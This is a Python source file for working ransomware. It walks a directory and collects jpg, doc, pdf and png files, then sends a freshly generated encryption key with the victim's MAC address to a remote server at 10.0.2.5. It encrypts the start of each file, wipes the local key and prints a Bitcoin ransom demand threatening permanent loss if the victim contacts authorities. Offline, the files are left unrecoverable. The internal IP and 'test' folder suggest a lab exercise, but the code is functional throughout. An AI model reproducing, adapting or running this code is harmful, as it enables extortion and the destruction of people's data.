from cryptography.fernet import Fernet
import os
import http.client
from uuid import getnode as get_mac

FILE_EXTENTIONS = ['jpg', 'doc', 'pdf', 'png']

def gen_tree(path):
    target_files = []
    for root, dirs, files in os.walk(path, topdown=False):
        for name in files:
            target = os.path.join(root, name)
            if target.split(".")[-1] in FILE_EXTENTIONS:
                target_files.append(target)
    return target_files


def gen_key():
    mac = get_mac()
    key = Fernet.generate_key()
    try:
        conn = http.client.HTTPConnection("10.0.2.5", 80)
        payload = '{\"key\": \"' + str(key) + '\",\"mac\": \"' + str(mac) + '\"}'
        headers = {
            'Content-Type': 'application/json'
        }
        conn.request("POST", "/api/v1/victims", payload, headers)
        res = conn.getresponse()
        data = res.read()
    except:
        return False, key
    return True, key


def encrypt(files, key):
    f = Fernet(key)
    for file in files:
        with open(file, 'rb') as fp:
            data = fp.read()

            if len(data) < 4000:
                target = data
                plain = ""
            else:
                target = data[:4000]
                plain = data[4000:]

            cipher = f.encrypt(target)
            cipher += plain
            fp.close()
        with open(file, 'wb') as fp:
            fp.write(cipher)
            fp.close()


def decrypt(files, key):
    f = Fernet(key)
    for file in files:
        with open(file, 'rb') as fp:
            cipher = fp.read()

            if len(cipher) < 5432:
                target = cipher
                plain = ""
            else:
                target = cipher[:5432]
                plain = cipher[5432:]

            data = f.decrypt(target)
            data += plain
            fp.close()
        with open(file, 'wb') as fp:
            fp.write(data)
            fp.close()


if __name__ == '__main__':
    files = gen_tree("test")
    online, key = gen_key()
    encrypt(files, key)
    key = ""
    if online:
        print("Hello stranger! Nice meeting you :) We have encrypted all your data :O But don't worry ;( We kept the \n\
               key ;) So, our demand is 666€ to be sent to this BitCoin wallet in less than 72h")
        print("Be WARNED!: "
              "\n1. If you close this window, everything is lost. "
              "\n2. If you close your computer, everything is lost."
              "\n3. If you talk to the authorities, everything is lost."
              "\n4. If you forget to breathe, everything is lost.")
        print(f"Once the money is wired, sent us an email to info@covid20.sexy with this code {get_mac()} and proof "
              f"of your payment. We will provide you the key shortly after...")
        key = input("Whenever you receive the key, type it here and press enter: ")
        decrypt(files, key)
    else:
        input("The computer is offline, all the files have been encrypted without possibility of recovery")
        #decrypt(files, key)

